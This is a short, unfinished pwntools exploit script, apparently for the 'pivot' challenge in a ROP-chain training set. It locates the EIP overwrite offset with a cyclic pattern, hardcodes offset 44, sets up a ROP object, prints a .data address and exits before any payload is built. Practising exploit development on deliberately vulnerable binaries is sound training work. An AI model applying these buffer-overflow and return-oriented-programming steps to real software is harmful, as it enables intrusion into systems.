import sys

from pwn import *
from rich import print

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# 0xf7fbb7ce <pwnme+273>             ret
gdbscript = '''
# break
b main
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './pivot'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

def find_eip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP at the time of crashing
    eip_offset = cyclic_find(p.corefile.eip, alphabet='bcdefhijk')
    info('located EIP offset at {a}'.format(a=eip_offset))
    # Return the EIP offset
    return eip_offset


if False:
    offset = find_eip(cyclic(100, alphabet='bcdefhijk'))
    success(f"{offset=}")
    sys.exit()


offset = 44

# binsh_offset = next(elf.search(b'/bin/cat'))

rop = ROP(elf)


# ➜  (venv)  write4_32 git:(master) ✗ readelf -S write432
  # [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
print(hex(elf.symbols.data_start))


sys.exit()
